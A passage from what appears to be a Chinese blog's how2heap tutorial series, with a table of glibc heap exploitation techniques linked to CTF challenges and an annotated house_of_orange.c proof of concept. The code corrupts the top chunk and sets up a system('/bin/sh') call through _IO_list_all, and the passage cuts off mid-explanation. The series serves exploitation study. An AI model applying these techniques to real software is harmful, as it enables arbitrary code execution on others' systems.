title="完结"></a>完结</h1><p>本系列到此就结束了，但堆的利用方式远远不止这些技巧，但万变不离其宗，希望看我文章的同学在不动的地方也动手调试一下</p><p>本文对堆的很多利用方式也给了我们一些启示，在寻找一些新的利用方式时，只要是没有被检查的地方都有可能是我们可以利用的地方</p><p>十分感谢shellphish团队的开源精神</p><p>最后也在这里贴出how2heap对于本项目的一个前言吧，说来也巧，在我写到这的时候正好遇到该项目把house_of_botcake加到了readme中，这里我也加上了</p><table><thead><tr><th>文件</th><th>技术</th><th>Glibc版本</th><th>对应的ctf题目</th></tr></thead><tbody><tr><td><a href="first_fit.c">first_fit.c</a></td><td>演示了glibc的first fit原则.</td><td></td><td></td></tr><tr><td><a href="calc_tcache_idx.c">calc_tcache_idx.c</a></td><td>演示如何计算tcache索引的方法.</td><td></td><td></td></tr><tr><td><a href="fastbin_dup.c">fastbin_dup.c</a></td><td>通过控制fast bin free list 来欺骗malloc,从而获得一个已经分配过的堆指针</td><td></td><td></td></tr><tr><td><a href="glibc_2.25/fastbin_dup_into_stack.c">fastbin_dup_into_stack.c</a></td><td>通过构造fast bin free list来欺骗malloc,从而获得一个指向任意地址的堆指针</td><td>latest</td><td><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine">9447-search-engine</a>, <a href="http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">0ctf 2017-babyheap</a></td></tr><tr><td><a href="glibc_2.25/fastbin_dup_consolidate.c">fastbin_dup_consolidate.c</a></td><td>通过把一个指针既放到fastbin freelist中又放到unsorted bin中来欺骗malloc,从而获得一个已经分配了的堆指针</td><td>latest</td><td><a href="https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder">Hitcon 2016 SleepyHolder</a></td></tr><tr><td><a href="glibc_2.26/unsafe_unlink.c">unsafe_unlink.c</a></td><td>利用free在一个corrupted chunk上获得任意写的能力.</td><td>&lt; 2.26</td><td><a href="http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/">HITCON CTF 2014-stkof</a>, <a href="https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a">Insomni’hack 2017-Wheel of Robots</a></td></tr><tr><td><a href="glibc_2.25/house_of_spirit.c">house_of_spirit.c</a></td><td>通过释放一个伪造的fastbin来获得一个指向任意地址的指针.</td><td>latest</td><td><a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo">hack.lu CTF 2014-OREO</a></td></tr><tr><td><a href="glibc_2.25/poison_null_byte.c">poison_null_byte.c</a></td><td>利用单个空字节溢出</td><td>&lt; 2.26</td><td><a href="https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb">PlaidCTF 2015-plaiddb</a></td></tr><tr><td><a href="glibc_2.26/house_of_lore.c">house_of_lore.c</a></td><td>通过伪造smallbin freelist来欺骗malloc,从而获得一个指向任意地址的指针</td><td>&lt; 2.26</td><td></td></tr><tr><td><a href="glibc_2.26/overlapping_chunks.c">overlapping_chunks.c</a></td><td>通过溢出修改一个free 掉的 unsorted bin的size来使得新分配的chunk与已经存在的chunk产生重叠</td><td>&lt; 2.26</td><td><a href="https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore">hack.lu CTF 2015-bookstore</a>, <a href="https://github.com/ctfs/write-ups-2016/tree/master/nuitduhack-quals-2016/exploit-me/night-deamonic-heap-400">Nuit du Hack 2016-night-deamonic-heap</a></td></tr><tr><td><a href="glibc_2.25/overlapping_chunks_2.c">overlapping_chunks_2.c</a></td><td>利用溢出漏洞修改一个正在使用的chunk的size来使得我们新分配的chunk和已经存在的chunk产生重叠</td><td>latest</td><td></td></tr><tr><td><a href="glibc_2.25/house_of_force.c">house_of_force.c</a></td><td>利用top chunk的hearder来让malloc返回一个几乎指向任意地址的内存</td><td>&lt; 2.29</td><td><a href="https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6">Boston Key Party 2016-cookbook</a>, <a href="https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200">BCTF 2016-bcloud</a></td></tr><tr><td><a href="glibc_2.26/unsorted_bin_into_stack.c">unsorted_bin_into_stack.c</a></td><td>利用溢出漏洞修改一个在unsorted bin freelist的被free掉的chunk来获得一个指向几乎任意地址的指针</td><td>&lt; 2.26</td><td></td></tr><tr><td><a href="glibc_2.26/unsorted_bin_attack.c">unsorted_bin_attack.c</a></td><td>利用溢出一个在unsorted bin freelist的被free掉的chunk来将一个超大的值写到任意地址</td><td>&lt; 2.28</td><td><a href="https://github.com/ctfs/write-ups-2016/tree/master/0ctf-2016/exploit/zerostorage-6">0ctf 2016-zerostorage</a></td></tr><tr><td><a href="glibc_2.26/large_bin_attack.c">large_bin_attack.c</a></td><td>利用溢出一个在large bin freelist上的被Free掉的chunk来向任意地址写一个超大的值</td><td>&lt; 2.26</td><td><a href="https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/">0ctf 2018-heapstorm2</a></td></tr><tr><td><a href="glibc_2.26/house_of_einherjar.c">house_of_einherjar.c</a></td><td>利用一个空字节溢出来欺骗malloc,从而获得一个被我们控制的指针</td><td>&lt; 2.26</td><td><a href="https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf">Seccon 2016-tinypad</a></td></tr><tr><td><a href="glibc_2.25/house_of_orange.c">house_of_orange.c</a></td><td>利用top chunk来获得任意代码执行的方法</td><td>&lt; 2.26</td><td><a href="https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/house-of-orange-500">Hitcon 2016 houseoforange</a></td></tr><tr><td><a href="glibc_2.26/tcache_dup.c">tcache_dup.c</a></td><td>通过控制tcache freelist来欺骗malloc,从而获得一个已经分配的堆指针</td><td>2.26 - 2.28</td><td></td></tr><tr><td><a href="glibc_2.26/tcache_poisoning.c">tcache_poisoning.c</a></td><td>通过控制tcache freelist来欺骗malloc从而获得一个机会指向任意地址的指针</td><td>&gt; 2.25</td><td></td></tr><tr><td><a href="glibc_2.26/tcache_house_of_spirit.c">tcache_house_of_spirit.c</a></td><td>free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针</td><td>&gt; 2.25</td><td></td></tr><tr><td><a href="glibc_2.26/house_of_botcake.c">house_of_botcake.c</a></td><td>bypass tcache的 double free的检查</td><td>&gt;2.25</td><td></td></tr></tbody></table><p>文章首发于安全客，转载请著名出处，文章链接<a href="https://www.anquanke.com/post/id/199468">https://www.anquanke.com/post/id/199468</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>how2heap总结计划七</title>
    <link href="/2020/02/02/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%B8%83/"/>
    <url>/2020/02/02/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%B8%83/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文包含house of orange</p></blockquote><p>PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 :)</p><h2 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>ctf-wiki.github.io<span class="hljs-regexp">/ctf-wiki/</span>pwn<span class="hljs-regexp">/linux/g</span>libc-heap<span class="hljs-regexp">/house_of_orange-zh/</span><br>http:<span class="hljs-regexp">//</span>blog.angelboy.tw/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">4</span>ngelboy.blogspot.com<span class="hljs-regexp">/2016/</span><span class="hljs-number">10</span>/hitcon-ctf-qual-<span class="hljs-number">2016</span>-house-of-orange.html<br></code></pre></td></tr></table></figure><h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>house of orange来自angelboy在hitcon 2016上出的一道题目,这个攻击方法并不单指本文所说的,而是指关于其一系列的伴生题目的漏洞利用技巧</p><p>其最主要的原理就是在没有free的情况下如何产生一个free状态的bins和io_file的利用</p><p>但最最最主要的利用是io_file的利用</p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>这里我一行都没有删,仅仅加了注释</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span><br><span class="hljs-comment">  It requires a leak of the heap and the libc</span><br><span class="hljs-comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   This function is just present to emulate the scenario where</span><br><span class="hljs-comment">   the address of the function system is known.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">winner</span> <span class="hljs-params">( <span class="hljs-type">char</span> *ptr)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      //house of orange</span><br><span class="hljs-comment">      //house of orange开始于一个在堆上有一个可以破坏top chunk的缓冲区溢出漏洞的假设</span><br><span class="hljs-comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span><br><span class="hljs-comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      //在执行前,整个heap都是top chunk的一部分</span><br><span class="hljs-comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span><br><span class="hljs-comment">      //通常来说,第一次申请内存的时候会从top chunk中切出一部分来处理请求</span><br><span class="hljs-comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span><br><span class="hljs-comment">      //然后,随着我们不停的分配top chunk,top chunk会变得越来越小</span><br><span class="hljs-comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span><br><span class="hljs-comment">      //而在我们所申请的size比top chunk更大时会有两件事情发生</span><br><span class="hljs-comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span><br><span class="hljs-comment">      there are two possibilities:</span><br><span class="hljs-comment">      //1.拓展top chunk,mmap一个新页</span><br><span class="hljs-comment">       1) Extend the Top chunk</span><br><span class="hljs-comment">       2) Mmap a new page</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      If the size requested is smaller than 0x21000, then the former is followed.</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-type">char</span> *p1, *p2;<br>    <span class="hljs-type">size_t</span> io_list_all, *top;<br><br>    <span class="hljs-comment">//在2.26的更改中,程序不在调用_IO_flush_all_lockp的malloc_printer的行为移除了我们攻击的媒介</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span><br>        <span class="hljs-string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);<br><br>    <span class="hljs-comment">//由于对glibc 2.24 中 _IO_FILE vtable进行了白名单检查,因此这种攻击手段得到了抑制</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span><br>        <span class="hljs-string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      Firstly, lets allocate a chunk on the heap.</span><br><span class="hljs-comment">    */</span><br><br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span><span class="hljs-number">-16</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      //通常来说,堆是被一个大小为0x21000的top chunk所分配的</span><br><span class="hljs-comment">       The heap is usually allocated with a top chunk of size 0x21000</span><br><span class="hljs-comment">       //在我们分配了一个0x400的chunk后</span><br><span class="hljs-comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span><br><span class="hljs-comment">       //我们剩下的大小为0x20c00,在prev_inuse位被设为1后,应该是0x20c01</span><br><span class="hljs-comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       //heap的边界是页对齐的.由于top chunk是对上的最后一个chunk,因此它在结尾也必须是页对齐的</span><br><span class="hljs-comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span><br><span class="hljs-comment">       it must also be page aligned at the end.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       //并且,如果一个与top chunk,相邻的chunk被释放了.那么就会与top chunk合并.因此top chunk 的prev_inus位也一直被设置为1</span><br><span class="hljs-comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span><br><span class="hljs-comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span><br><span class="hljs-comment">       //这也就意味着始终要满足两个条件</span><br><span class="hljs-comment">       So that means that there are two conditions that must always be true.</span><br><span class="hljs-comment">       //1) top chunk+size必须是页对齐的</span><br><span class="hljs-comment">        1) Top chunk + size has to be page aligned</span><br><span class="hljs-comment">        //2)top chunk的prev_inuse位必须为1</span><br><span class="hljs-comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       //如果我们将top chunk的size设为0xcc|PREV_INUSE的时候,所有的条件都会满足</span><br><span class="hljs-comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span><br><span class="hljs-comment">       //我们剩下了0x20c01</span><br><span class="hljs-comment">       What&#x27;s left is 0x20c01</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Now, let&#x27;s satisfy the conditions</span><br><span class="hljs-comment">       1) Top chunk + size has to be page aligned</span><br><span class="hljs-comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span><br><span class="hljs-comment">    */</span><br><br>    top = (<span class="hljs-type">size_t</span> *) ( (<span class="hljs-type">char</span> *) p1 + <span class="hljs-number">0x400</span> - <span class="hljs-number">16</span>);<br>    top[<span class="hljs-number">1</span>] = <span class="hljs-number">0xc01</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       //现在我们需要一个比top chunk的size更大的chunk</span><br><span class="hljs-comment">       Now we request a chunk of size larger than the size of the Top chunk.</span><br><span class="hljs-comment">       //malloc会通过拓展top chunk来满足我们的需求</span><br><span class="hljs-comment">       Malloc tries to service this request by extending the Top chunk</span><br><span class="hljs-comment">       //这个会强制调用sysmalloc</span><br><span class="hljs-comment">       This forces sysmalloc to be invoked.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In the usual scenario, the heap looks like the following</span><br><span class="hljs-comment">          |------------|------------|------...----|</span><br><span class="hljs-comment">          |    chunk   |    chunk   | Top  ...    |</span><br><span class="hljs-comment">          |------------|------------|------...----|</span><br><span class="hljs-comment">      heap start                              heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       //并且新分配的区域将于旧的heap的末尾相邻</span><br><span class="hljs-comment">       And the new area that gets allocated is contiguous to the old heap end.</span><br><span class="hljs-comment">       //因此top chunk的新size是旧的szie和新分配的size之和</span><br><span class="hljs-comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       //为了持续跟踪size的改变,malloc使用了一个fencepost chunk来作为一个临时的chunk</span><br><span class="hljs-comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span><br><span class="hljs-comment">       which is basically a temporary chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       //在top chunk的size被更新之后,这个chunk将会被Free</span><br><span class="hljs-comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In our scenario however, the heap looks like</span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment">     heap start                            heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       //在这个情况下,新的top chunk将会在heap的末尾相邻处开始</span><br><span class="hljs-comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span><br><span class="hljs-comment">       //因此这个在第二个chunk和heap结尾的区域之间是没有被使用的</span><br><span class="hljs-comment">       So the area between the second chunk and the heap end is unused.</span><br><span class="hljs-comment">       //但旧的top chunk却被释放了</span><br><span class="hljs-comment">       And the old Top chunk gets freed.</span><br><span class="hljs-comment">       //由于被释放的top chunk又比fastbin sizes要哒,他会被放进我们的unsorted bins中</span><br><span class="hljs-comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span><br><span class="hljs-comment">       it gets added to list of unsorted bins.</span><br><span class="hljs-comment">       //现在我们需要一个比top chunk更大的chunk</span><br><span class="hljs-comment">       Now we request a chunk of size larger than the size of the top chunk.</span><br><span class="hljs-comment">       //就会强行调用sysmalloc了</span><br><span class="hljs-comment">       This forces sysmalloc to be invoked.</span><br><span class="hljs-comment">       And ultimately invokes _int_free</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Finally the heap looks like this:</span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment">     heap start                                             new heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br>    p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      //需要注意的是,上面的chunk会被分配到零一页中,它会被放到哦旧的heap的末尾</span><br><span class="hljs-comment">      Note that the above chunk will be allocated in a different page</span><br><span class="hljs-comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      //现在我们就留下了那个被free掉的旧top chunk,他被放入了unsorted bin中</span><br><span class="hljs-comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      //从这里开始就是攻击的第二阶段了,我们假设我们有了一个可以溢出到old top chunk的漏洞来让我们可以覆写chunk的size</span><br><span class="hljs-comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span><br><span class="hljs-comment">      top chunk so we could overwrite the chunk&#x27;s size.</span><br><span class="hljs-comment">      //第二段我们需要再次利用溢出来覆写在unsorted bin内chunk的fd和bk指针</span><br><span class="hljs-comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span><br><span class="hljs-comment">      of this chunk in the unsorted bin list.</span><br><span class="hljs-comment">      //有两个常见的方法来利用当前的状态:</span><br><span class="hljs-comment">      There are two common ways to exploit the current state:</span><br><span class="hljs-comment">      //通过设置指针来造成任意地址分配(需要至少分配两次)</span><br><span class="hljs-comment">      //用chunk的unlink来写libc的main_arena unsorted-bin-list(需要至少一次分配)</span><br><span class="hljs-comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span><br><span class="hljs-comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span><br><span class="hljs-comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span><br><span class="hljs-comment">      //之前的攻击都很容易利用,因此这里我们只详细说明后者的一种变体,是由angelboy的博客上出来的一种变体</span><br><span class="hljs-comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span><br><span class="hljs-comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      //这个攻击炒鸡棒,因为它利用了终止调用,而终止调用原本是它检测到堆的任何虚假状态才会触发的</span><br><span class="hljs-comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span><br><span class="hljs-comment">      is triggered when the libc detects any bogus state of the heap.</span><br><span class="hljs-comment">      //每当终止调用触发的时候,他都会通过调用_IO_flush_all_lockp刷新所有文件指针</span><br><span class="hljs-comment">      //最终会遍历_IO_list_all链表并调用_IO_OVERFLOW</span><br><span class="hljs-comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span><br><span class="hljs-comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span><br><span class="hljs-comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      //办法是通过一个fake pointer来覆写_IO_list_all指针,让_IO_OVERFLOW指向system函数并将其前8个字节设置为&#x27;/bin/sh&#x27;,这样就会在调用_IO_OVERFLOW时调用system(&#x27;/bin/sh&#x27;)</span><br><span class="hljs-comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span><br><span class="hljs-comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span><br><span class="hljs-comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span><br><span class="hljs-comment">      More about file-pointer exploitation can be found here:</span><br><span class="hljs-comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      //_IO_list_all的地址可以通过free chunk的fd和bk指针来计算,当他们指向libc的main_arena的时候</span><br><span class="hljs-comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as 